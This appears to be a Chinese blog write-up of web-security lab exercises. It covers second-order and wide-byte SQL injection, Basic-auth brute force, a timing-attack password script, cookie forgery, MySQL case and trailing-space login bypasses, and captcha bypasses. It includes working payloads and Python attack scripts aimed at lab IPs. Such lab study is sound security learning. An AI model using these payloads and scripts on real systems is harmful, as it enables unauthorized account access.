<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ruby">get <span class="hljs-string">&quot;/users/:id&quot;</span> <span class="hljs-keyword">do</span><br>    <span class="hljs-title class_">ActiveRecord</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Base</span>.establish_connection <span class="hljs-title class_">SQLInjectionExample8</span>.db<br>    <span class="hljs-variable">@user</span> = <span class="hljs-title class_">User</span>.find(params[<span class="hljs-symbol">:id</span>])<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable">@user</span>    <br>      <span class="hljs-keyword">begin</span> <br>        sql = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">#&#123;<span class="hljs-variable">@user</span>.username&#125;</span>&#x27; &quot;</span><br>        <span class="hljs-variable">@res</span> = <span class="hljs-title class_">ActiveRecord</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Base</span>.connection.execute(sql).to_a[<span class="hljs-number">0</span>]<br>        erb <span class="hljs-symbol">:user</span><br>      <span class="hljs-keyword">rescue</span> <span class="hljs-title class_">Exception</span> =&gt; e<br>        <span class="hljs-variable">@message</span> = e.to_s<br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span>  <br>  <span class="hljs-keyword">end</span><br><br>  post <span class="hljs-string">&#x27;/user&#x27;</span> <span class="hljs-keyword">do</span><br>    <span class="hljs-title class_">User</span>.create(<span class="hljs-symbol">:username</span> =&gt; params[<span class="hljs-symbol">:user</span>], <span class="hljs-symbol">:password</span> =&gt; <span class="hljs-title class_">Digest</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:MD5</span>.hexdigest(<span class="hljs-variable constant_">SEED</span>+params[<span class="hljs-string">&quot;password&quot;</span>]+<span class="hljs-variable constant_">SEED</span>))<br>    redirect <span class="hljs-title class_">SQLInjectionExample8</span>.path<br>  <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
<h2 id="Example-8"><a href="#Example-8" class="headerlink" title="Example-8"></a>Example 8</h2>
<p class='item-img' data-src='image-20231214195607585.png'><img src="image-20231214195607585.png" alt="image-20231214195607585"></p>
<p>简单测试几下，不难感觉这是一个二次注入，那我们就要首先创造一个含有恶意sql语句的用户名，接着我们需要找某个接口，这个接口会进行数据库查询用户名的功能，这样才能触发我们的恶意数据。</p>
<p>但这里刚开始只有一个创建用户，我并不能找到其他页面，也是看了wp发现可以dirsearch扫一下目录的，如下图扫到了users目录</p>
<p class='item-img' data-src='image-20231214203109764.png'><img src="image-20231214203109764.png" alt="image-20231214203109764"></p>
<p>不过回过头来我发现，那个左侧的数字可以直接点的。。。。</p>
<p class='item-img' data-src='image-20231214200656584.png'><img src="image-20231214200656584.png" alt="image-20231214200656584"></p>
<p class='item-img' data-src='image-20231214200703226.png'><img src="image-20231214200703226.png" alt="image-20231214200703226"></p>
<p>如上图，我们创建用户5之后，点击访问即可</p>
<h2 id="Example-9"><a href="#Example-9" class="headerlink" title="Example-9"></a>Example 9</h2>
<p>先赋个源码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs ruby">get <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">do</span><br>    <span class="hljs-title class_">ActiveRecord</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Base</span>.establish_connection <span class="hljs-title class_">SQLInjectionExample9</span>.db<br>    res = []<br>    <span class="hljs-keyword">if</span> params[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; params[<span class="hljs-string">&#x27;password&#x27;</span>] <br>      <span class="hljs-keyword">begin</span><br>        sql= <span class="hljs-string">&quot;SET CHARACTER SET &#x27;GBK&#x27;;&quot;</span> <br>        <span class="hljs-title class_">ActiveRecord</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Base</span>.connection.execute(sql)<br>        name = <span class="hljs-title class_">ActiveRecord</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Base</span>.connection.quote_string(params[<span class="hljs-symbol">:username</span>])<br>        password = <span class="hljs-title class_">Digest</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:MD5</span>.hexdigest(<span class="hljs-variable constant_">SEED</span>+<span class="hljs-title class_">ActiveRecord</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Base</span>.connection.quote_string(params[<span class="hljs-symbol">:password</span>]+<span class="hljs-variable constant_">SEED</span>))<br>        sql = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">#&#123;name&#125;</span>&#x27;&quot;</span><br>        sql+= <span class="hljs-string">&quot; AND password=&#x27;&quot;</span>+password+<span class="hljs-string">&quot;&#x27;&quot;</span><br>        res = <span class="hljs-title class_">ActiveRecord</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Base</span>.connection.execute(sql).to_a<br>      <span class="hljs-keyword">rescue</span> <span class="hljs-title class_">Exception</span> =&gt; e<br>        <span class="hljs-variable">@message</span> = e.to_s <br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    pp res<br>    <span class="hljs-keyword">if</span> res.size &gt; <span class="hljs-number">0</span><br>      erb <span class="hljs-symbol">:index</span><br>    <span class="hljs-keyword">else</span><br>      erb <span class="hljs-symbol">:login</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214201828779.png'><img src="image-20231214201828779.png" alt="image-20231214201828779"></p>
<p>查询页面，测试了一下不知道是啥玩意儿（感觉sql-labs白刷了。。。）看了wp发现是有关宽字节注入的</p>
<p>那我们直接payload，不过#需要编码或者直接用–+，原因：url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用（post传参则可以直接#）。</p>
<p>具体也可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lkbzhj/article/details/126149298?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170255735516800226584363%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=170255735516800226584363&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-126149298-null-null.142%5Ev96%5Epc_search_result_base8&amp;utm_term=sql%E6%B3%A8%E5%85%A5%23%2C--%2B%E7%9A%84%E4%BD%BF%E7%94%A8&amp;spm=1018.2226.3001.4187">SQL注入中 #、 --+、 --%20、 %23是什么意思？</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; or 1=1%23</span><br></code></pre></td></tr></table></figure>
<p>这样我们的单引号就逃逸出来了，我们就可以正常万能密码</p>
<p>这里附一个师傅的脚本，用来检测哪些是可以进行宽字节注入的字符</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sql9</span>():<br>    url = <span class="hljs-string">&quot;http://10.108.40.237/sqlinjection/example9/?username=a%&#123;&#125;%27%20or%201=1%23&amp;password=a&amp;submit=Submit&quot;</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">255</span>):<br>        char = <span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(char) == <span class="hljs-number">1</span>:<br>            char = <span class="hljs-string">&quot;0&quot;</span> + char<br>        html = requests.get(url.<span class="hljs-built_in">format</span>(char))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Success&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] 0x&#123;&#125; works&quot;</span>.<span class="hljs-built_in">format</span>(char)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Done&quot;</span><br></code></pre></td></tr></table></figure>
<h1>0x03 Authentication-认证</h1>
<p>官方说明：</p>
<p>本节汇总了身份验证页面中的问题示例：从微不足道的暴力破解到更复杂的问题。</p>
<h2 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example-1-2"></a>Example 1</h2>
<p class='item-img' data-src='image-20231216183606878.png'><img src="image-20231216183606878.png" alt="image-20231216183606878"></p>
<p>进入页面是一个js的登录框，刷题多了就很熟悉，估计这里会有一个Authentication头其中会包含你在上述输入框中输入的用户名和密码，并且是经过base64加密的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。<br></code></pre></td></tr></table></figure>
<p>因此我们可以在输入之后通过bp抓一下，进行爆破即可</p>
<p class='item-img' data-src='image-20231216195501686.png'><img src="image-20231216195501686.png" alt="image-20231216195501686"></p>
<p>由上图可得，这里我们可以进行爆破，不过毕竟这里是第一关，我们或许可以尝试弱口令</p>
<p class='item-img' data-src='image-20231216195555742.png'><img src="image-20231216195555742.png" alt="image-20231216195555742"></p>
<p>果不其然，这里admin，admin即可登录</p>
<h2 id="Example-2-2"><a href="#Example-2-2" class="headerlink" title="Example-2-2"></a>Example 2</h2>
<p class='item-img' data-src='image-20231216195815044.png'><img src="image-20231216195815044.png" alt="image-20231216195815044"></p>
<p>第二关没那么幸运，并不是弱口令，不过这里提示我们username是hacker，我们只需要爆破password即可，这里肯定是需要运气成分了，如果你的字典够强大，那肯定可以跑出来。不过这毕竟是第二关，估计不会如此考运气。因此我们看一下wp如何写</p>
<p>官方是这样说的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">This example is an exagerated version of a non-time-constant string comparison vulnerability. If you compare two strings and stop at the first invalid character, a string A with the first 6 characters in common with the string B will take more time to compare than a string A’ with only the first 2 characters in common with the string B. You can use this information to brute force the password in this example.<br>译文：<br>这个例子是一个非时间常数字符串比较漏洞的夸张版本。如果比较两个字符串并在第一个无效字符处停止，与字符串B相同的前6个字符的字符串a比与字符串B只有前2个字符的字符串a需要更多的时间进行比较。<br></code></pre></td></tr></table></figure>
<p>意思就是如果我们的真正密码是password</p>
<p>此时如果我们拿pahahahah和passwoxxx与上述正确密码进行比较的话，那么肯定passwoxxx比较的时间更长（因为pahhh在第三个字符开始就不匹配了，而passwoxxx会持续匹配），因此我们可以根据比较时间长短来逐位爆破密码：</p>
<p>authentication是逐位比较的，所以正确的为一位位比较下去，这样就会花更长的时间，那么就可以写脚本跑了，不过不会写，这里我就跟着大师傅们学着写：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> requests.auth <span class="hljs-keyword">import</span> HTTPBasicAuth<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">auth2</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.123.41/authentication/example2/&quot;</span><br>    base_time = <span class="hljs-literal">None</span><br>    password = <span class="hljs-string">&quot;&quot;</span><br>    passwords = string.ascii_letters + string.digits<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        tmp_start = time.time()<br>        html = requests.get(url, auth=HTTPBasicAuth(<span class="hljs-string">&quot;hacker&quot;</span>, password + <span class="hljs-string">&quot;a&quot;</span>))<br>        base_time = time.time() - tmp_start<br>        <span class="hljs-keyword">for</span> pwd <span class="hljs-keyword">in</span> passwords:<br>            start = time.time()<br>            html = requests.get(url, auth=HTTPBasicAuth(<span class="hljs-string">&quot;hacker&quot;</span>, <span class="hljs-string">&#x27;p4ssw0r&#x27;</span> + pwd))<br>            used_time = time.time() - start<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hacker:&#123;0&#125; -&gt; &#123;1&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;p4ssw0r&#x27;</span> + pwd, used_time))<br>            <span class="hljs-keyword">if</span> html.status_code == <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] FIND PASSWORD: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(password + pwd))<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">if</span> used_time - base_time &gt; <span class="hljs-number">0.1</span>:<br>                password += pwd<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] password: &#123;&#125; ..&quot;</span>.<span class="hljs-built_in">format</span>(password))<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">elif</span> base_time - used_time &gt; <span class="hljs-number">0.1</span>:<br>                password += <span class="hljs-string">&quot;a&quot;</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] password: &#123;&#125; ..&quot;</span>.<span class="hljs-built_in">format</span>(password))<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Use Time: &#123;&#125;, password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(time.time()-start, password + pwd))<br><br>auth2()<br></code></pre></td></tr></table></figure>
<p>上述脚本根本爆破不出来，因此一位一位的比较成功的概率是高的。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> requests.auth <span class="hljs-keyword">import</span> HTTPBasicAuth<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">auth2</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.123.41/authentication/example2/&quot;</span><br>    base_time = <span class="hljs-literal">None</span><br>    password = <span class="hljs-string">&quot;&quot;</span><br>    passwords = string.ascii_letters + string.digits<br>    <span class="hljs-keyword">for</span> pwd <span class="hljs-keyword">in</span> passwords:<br>        start = time.time()<br>        html = requests.get(url, auth=HTTPBasicAuth(<span class="hljs-string">&quot;hacker&quot;</span>, <span class="hljs-string">&#x27;p4ssw0r&#x27;</span> + pwd))<br>        used_time = time.time() - start<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hacker:&#123;0&#125; -&gt; &#123;1&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;p4ssw0r&#x27;</span> + pwd, used_time))<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231216210257430.png'><img src="image-20231216210257430.png" alt="image-20231216210257430"></p>
<p>这里测试了半天，发现总是爆破不出来，之后选择看看每一位爆破的时间，如上图，发现这种方法不稳定，时间差不好确定，只能把每一次爆破的时间都拿出来进行比较才更可能确定密码。（而且爆破第一位p的时间明显还低于其他字符。。。）只能说这可能是我靶场的问题吧，不过我们学一个思路也是好的。</p>
<p class='item-img' data-src='image-20231216210701724.png'><img src="image-20231216210701724.png" alt="image-20231216210701724"></p>
<p>总的来说误差挺大的。。。。最终密码为：p4ssw0rd 我看着其他师傅的脚本也基本没效果了现在。</p>
<p>但当我输入hacker与上述密码之后，没有登陆成功。。。。真的不理解了，不过等了半天的bp爆破成功了</p>
<p class='item-img' data-src='image-20231217135625206.png'><img src="image-20231217135625206.png" alt="image-20231217135625206"></p>
<p class='item-img' data-src='image-20231217135631327.png'><img src="image-20231217135631327.png" alt="image-20231217135631327"></p>
<p>密码的确没问题，后续又试了试登录成功了。。。。</p>
<h2 id="Example-3-2"><a href="#Example-3-2" class="headerlink" title="Example-3-2"></a>Example 3</h2>
<p class='item-img' data-src='image-20231216212553464.png'><img src="image-20231216212553464.png" alt="image-20231216212553464"></p>
<p>根据提示我们先以user1的身份登陆一下，且bp抓包</p>
<p class='item-img' data-src='image-20231216212622043.png'><img src="image-20231216212622043.png" alt="image-20231216212622043"></p>
<p>可以看到cookie字段中含有user=user1的内容，那基本上就是修改这里了，我们直接将user1修改为admin即可，但同时也要主意将上述的?后面的get传参的内容除去，不然这是会冲突的</p>
<p class='item-img' data-src='image-20231216212741373.png'><img src="image-20231216212741373.png" alt="image-20231216212741373"></p>
<h2 id="Example-4-2"><a href="#Example-4-2" class="headerlink" title="Example-4-2"></a>Example 4</h2>
<p class='item-img' data-src='image-20231216212849003.png'><img src="image-20231216212849003.png" alt="image-20231216212849003"></p>
<p>相同的问题</p>
<p class='item-img' data-src='image-20231216212936743.png'><img src="image-20231216212936743.png" alt="image-20231216212936743"></p>
<p>与上关类似，不过这里修改为了md5加密，那我们将admin加密即可</p>
<p class='item-img' data-src='image-20231216213206228.png'><img src="image-20231216213206228.png" alt="image-20231216213206228"></p>
<h2 id="Example-5-2"><a href="#Example-5-2" class="headerlink" title="Example-5-2"></a>Example 5</h2>
<p class='item-img' data-src='image-20231216214309804.png'><img src="image-20231216214309804.png" alt="image-20231216214309804"></p>
<p>这一关我首先进行了注测，并抓取了对应的数据包，如下图，我们可以看到其中有rack.session的字段，我以为这里需要找到key去伪造这个session，但我不知道去哪找，于是陷入了困境，接着看了wp发现利用的MySQL对数据大小写不敏感的特性？？？</p>
<p class='item-img' data-src='image-20231216214301358.png'><img src="image-20231216214301358.png" alt="image-20231216214301358"></p>
<p>官方这样说道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">此示例显示了不同字符串比较方法的结果。创建用户时，应用程序将以编程方式通过将提供的用户名与现有用户进行比较来检查该用户是否不存在。当您登录时，应用程序将检查您的用户名和密码是否正确，然后将您的用户名保存在您的会话中。最后，每次您访问应用程序时，应用程序都会根据会话中提供的用户名检索用户的详细信息。<br><br>The trick here comes from the fact that the comparison when you create a user is done programmatically (i.e.: in Ruby) but when the user&#x27;s details get retrieved, the comparison is done by the database. By default, MySQL (with the type VARCHAR) will perform a case insensitive comparison: &quot;admin&quot; and &quot;Admin&quot; are the same value.<br><br>这里的技巧来自于这样一个事实：创建用户时的比较是以编程方式完成的（即：在 Ruby 中），但是当检索用户的详细信息时，比较是由数据库完成的。默认情况下，MySQL（类型为 VARCHAR ）将执行不区分大小写的比较：“admin”和“Admin”是相同的值。<br></code></pre></td></tr></table></figure>
<p>这样说的话，我们直接注册Admin即可了，这样在注册的时候是由编程语言完成比较的，很明显admin！=Admin，但在后续登录时，MySQL不区分大小写，会将Admin认为是admin。–不得不说很神奇</p>
<p class='item-img' data-src='image-20231216214642044.png'><img src="image-20231216214642044.png" alt="image-20231216214642044"></p>
<p class='item-img' data-src='image-20231216214655732.png'><img src="image-20231216214655732.png" alt="image-20231216214655732"></p>
<p>这样我们直接以admin：123456登录即可，但最后仍然显示Admin，这点不理解</p>
<p class='item-img' data-src='image-20231216214942000.png'><img src="image-20231216214942000.png" alt="image-20231216214942000"></p>
<h2 id="Example-6-2"><a href="#Example-6-2" class="headerlink" title="Example-6-2"></a>Example 6</h2>
<p>为了修复之前的问题，开发人员决定在用户创建过程中使用区分大小写的比较。根据 MySQL 执行字符串比较的方式，也可以绕过此检查：MySQL 忽略尾随空格（即： <code>pentesterlab</code> 和 <code>pentesterlab</code> 相等）。使用与上面相同的方法，您应该能够假装以用户 <code>admin</code> 身份登录。</p>
<p>那我们直接注册admin 即可注意这里有空格，接着我们用admin用户以及我们设置的密码登录即可</p>
<p class='item-img' data-src='image-20231216215626409.png'><img src="image-20231216215626409.png" alt="image-20231216215626409"></p>
<p>防止此问题的一个好方法是告诉数据库用户名是主键。例如，Tomcat 文档中使用此方法将 SQL 后端用作 Realm。</p>
<h1>0x04 Captcha-验证码</h1>
<p>官方说明：</p>
<p>在攻击验证码时，在开始一些硬核编码之前，请确保不存在逻辑缺陷或某种可预测性。如果您可以在不破坏验证码的情况下绕过它…请不要破坏它！</p>
<p>关注细节是发现验证码逻辑缺陷的关键。当您需要破解验证码时，请确保检查响应的每个细节。</p>
<p>第一个示例是开发不良的验证码，具有常见的逻辑缺陷，后面的示例更容易破解并且可以破解。</p>
<p>在以下所有示例中，目标是围绕验证码构建自动化，并实现高成功率（大多数情况下为 100%）。</p>
<h2 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example-1-3"></a>Example 1</h2>
<p class='item-img' data-src='image-20231216220711106.png'><img src="image-20231216220711106.png" alt="image-20231216220711106"></p>
<p>映入眼帘的是一个验证码页面，这里的意思估计是要绕过验证码吧？我们看官方提示</p>
<p>此脚本是验证码实施不当的常见问题。为了避免出现错误消息，开发人员在确保其值正确之前先检查验证码参数是否存在：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:captcha</span>] <span class="hljs-keyword">and</span> params[<span class="hljs-symbol">:captcha</span>] != session[<span class="hljs-symbol">:captcha</span>]<br>  <span class="hljs-comment"># ERROR: CAPTCHA is invalid redirect</span><br>  [...]<br><span class="hljs-keyword">end</span> <br><span class="hljs-comment"># CAPTCHA is valid</span><br>[...]<br></code></pre></td></tr></table></figure>
<p>但是，此示例存在一个漏洞：如果未提供验证码，则脚本不会安全失败。</p>
<p>这里看代码就知道，如果我们没有提供<code>captcha</code>参数的话，他就不会进行后续是否正确的判断了，这意味着如果我们删除这个参数，我们直接就可以进入后台而不必输入验证码</p>
<p>当我们先输入验证码抓包后：</p>
<p class='item-img' data-src='image-20231216221000266.png'><img src="image-20231216221000266.png" alt="image-20231216221000266"></p>
<p>如上图，其中包含captcha参数，那我们像下图一样，将该参数删掉看看</p>
<p class='item-img' data-src='image-20231216220910921.png'><img src="image-20231216220910921.png" alt="image-20231216220910921"></p>
<p>如上图，成功绕过</p>
<h2 id="Example-2-3"><a href="#Example-2-3" class="headerlink" title="Example-2-3"></a>Example 2</h2>
<p class='item-img' data-src='image-20231216221204837.png'><img src="image-20231216221204837.png" alt="image-20231216221204837"></p>
<p>仍然是验证码页面，习惯的我直接查看页面源代码，结果有新奇的发现</p>
<p class='item-img' data-src='image-20231216221238219.png'><img src="image-20231216221238219.png" alt="image-20231216221238219"></p>
<p>对应的验证码图片下，有一个隐藏的表单，其中含有的value似乎就是验证码的内容，我们直接复制登录即可，但不清楚是否这样做是正解，我们看一下官方说明</p>
<p>在此示例中，答案由应用程序泄露。通过检查返回的 HTML 页面的源代码，您应该能够编写一个可以自动破解此验证码的脚本。</p>
<p>似乎经过这样的解释我明白了：如果我们找到一个web页面，其中要求你登录，但同时有着验证码的限制导致我们在爆破用户名和密码时会有一定的阻力，此时由于每次刷新验证码的时候，都会在html中显示，这意味着我们可以在爆破的时候，同时抓取html的验证码元素，这样相当于无阻力无限制的爆破用户名和密码了。</p>
<h2 id="Example-3-3"><a href="#Example-3-3" class="headerlink" title="Example-3-3"></a>Example 3</h2>
<p class='item-img' data-src='image-20231216221925413.png'><img src="image-20231216221925413.png" alt="image-20231216221925413"></p>
<p>不过这一关查看源代码会发现什么也没有，但我们继续检查会发现，在cookie处会暴露我们的captcha验证码</p>
<p class='item-img' data-src='image-20231216222007945.png'><img src="image-20231216222007945.png" alt="image-20231216222007945"></p>
<p>官方说明：您还可以使用 JavaScript 控制台从 cookie 中检索验证码并调用 <code>document.cookie</code> ：</p>
<h2 id="Example-4-3"><a href="#Example-4-3" class="headerlink" title="Example-4-3"></a>Example 4</h2>
<p>这关开始没搞懂啥意思，我们看官方说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这是一个非常有趣的例子，因为这是我在开发这套练习时犯的一个错误。<br><br>在这里，您不必真正破解验证码。您只需要破解一次，就可以重复使用相同的值和会话 ID 来一次又一次地执行相同的请求。当您尝试破解验证码时，请确保答案只能使用一次。您可以通过编写一个采用会话 ID 和参数值的脚本来轻松地编写此漏洞利用脚本，然后一次又一次地提交它们。<br></code></pre></td></tr></table></figure>
<p>这意味着我们只需要得知一次正确的验证码，并且在后续我们可以重复提交该验证码，而不必担心该验证码失效的情况，这意味着我们又可以无限制的爆破响应的用户名和密码了</p>
<p class='item-img' data-src='image-20231216222644504.png'><img src="image-20231216222644504.png" alt="image-20231216222644504"></p>
<p class='item-img' data-src='image-20231216222657548.png'><img src="image-20231216222657548.png" alt="image-20231216222657548"></p>
<p>这两个时间点下都是成功的！</p>
<p>附上一个大佬写的脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">captcha4</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.123.41/captcha/example4/submit?captcha=kernel&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&quot;</span><br>    header = &#123;<br>        <span class="hljs-string">&quot;Cookie&quot;</span> : (<span class="hljs-string">&quot;rack.session=114cbd0bbb0b1a7a0758e3566dd975729b7b08f3cc3d86728206e60beacd3dc4&quot;</span>),<br>        <span class="hljs-string">&quot;Referer&quot;</span> : <span class="hljs-string">&quot;http://192.168.123.41/captcha/example4/&quot;</span><br>    &#125;<br>    ss = requests.session()<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        html = ss.get(url, headers=header)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;html.code: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(html.status_code))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Success&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Done&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Error&quot;</span>)<br><br>captcha4()<br></code></pre></td></tr></table></figure>
<p>不过我认为是有问题的</p>
<h2 id="Example-5-3"><a href="#Example-5-3" class="headerlink" title="Example-5-3"></a>Example 5</h2>
<p>这里虽然没有思路，但在测试的时候发现，你不断的刷新页面，会发现页面回显的验证码是有重复的。但经验少的我并不清楚这有什么弱点，我们继续看官方说明</p>
